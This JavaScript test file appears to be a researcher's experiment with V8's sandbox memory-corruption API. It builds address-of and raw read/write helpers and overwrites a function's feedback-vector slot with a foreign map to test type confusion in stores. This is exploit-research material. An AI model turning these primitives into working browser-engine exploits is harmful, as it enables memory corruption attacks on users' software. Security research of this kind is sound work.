// Build d8 using:
// a) Run once
//    git checkout 18865d6af0404f2d2aeb1c99dd73503364ce0967
//    gclient sync
//    gn gen ./out/x64.debug
//    gn gen ./out/x64.release
//   
//    MODIFY "build.gn"
//      v8_expose_memory_corruption_api = true
//
// b) 
//    Debug Build:
//    ninja -C ./out/x64.debug d8
//
//    Release Build:
//    ninja -C ./out/x64.release d8
//
// Run:
// C:\path\to\v8\d8.exe --allow-natives-syntax --bytecode-old-age=3 test.js

//This file is some tests I did to find the viability of feedback vector type confusion

var sandbox_mem_view = new Sandbox.MemoryView(0, 0xfffffff8);
var sandbox_dv = new DataView(sandbox_mem_view);
function addr_of(o) {
    let result = Sandbox.getAddressOf(o);
    return result;
}
function read_u32(addr) {
    let result = sandbox_dv.getUint32(addr, true);
    return result;
}
function write_u32(addr, val) {
    sandbox_dv.setUint32(addr, val, true);  
}
function unptr(addr) {
    return addr & ~3;
}
function unsmi(val) {
    return val >> 1;
}

function store(o, val) {
    o.p1 = val;
}
%EnsureFeedbackVectorForFunction(store);
//leave this or else the alignment is mucked up
var obj2 = {p1: 1, p2: 2, p3: 3, p4: 4};

var big_obj = {p1: 1, p2: 2, p3: 3, p4: 4, p5: 5, p6: 6, p7: 7, p8: 8, p9: 9, p10: 10, p11: 11, p12: 12, p13: 13, p14: 14, p15: 15, p16: 16, p17: 17, p18: 18};
big_obj.extra = 1;  //transition to a new map with a clear prototype validity cell

var obj1 = {p1: 1, p2: 2, p3: 3, p4: 4};
var arr1 = [1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310]; //0x0000222200002222
//var arr1 = [1.1, 2.2, 3.3, 4.4];
var arr2 = [obj1,2,3,4,5,6,7,8];
store(obj1, 0x1337);

let store_func_addr = addr_of(store);
let feedback_cell_addr = unptr(read_u32(store_func_addr + 0x14));
let feedback_vector_addr = unptr(read_u32(feedback_cell_addr + 4));
let raw_feedback_slots = feedback_vector_addr + 0x20;

let slot0 = unptr(read_u32(raw_feedback_slots + 0*4));
let slot1 = unptr(read_u32(raw_feedback_slots + 1*4));

let obj1_addr = addr_of(obj1);
let big_obj_addr = addr_of(big_obj);
let big_obj_map = read_u32(big_obj_addr);

%GlobalPrint("store_func_addr = " + store_func_addr.toString(16) + "\n");
%GlobalPrint("feedback_cell_addr = " + feedback_cell_addr.toString(16) + "\n");
%GlobalPrint("feedback_vector_addr = " + feedback_vector_addr.toString(16) + "\n");
%GlobalPrint("raw_feedback_slots = " + raw_feedback_slots.toString(16) + "\n");
%GlobalPrint("slot0 = " + slot0.toString(16) + "\n");
%GlobalPrint("slot1 = " + slot1.toString(16) + "\n");
%GlobalPrint("obj1_addr = " + obj1_addr.toString(16) + "\n");
%GlobalPrint("big_obj_addr = " + big_obj_addr.toString(16) + "\n");
%GlobalPrint("big_obj_map = " + big_obj_map.toString(16) + "\n");


%DebugPrint(store);

write_u32(raw_feedback_slots + 1*4, big_obj_map|0b11);

%DebugPrint(store);

%DebugPrint(obj1);
%DebugPrint(big_obj);
//%SystemBreak();
store(obj1, 0x1111);

//%DebugPrint(obj1);
%DebugPrint(obj1);
//%DebugPrint(arr1);


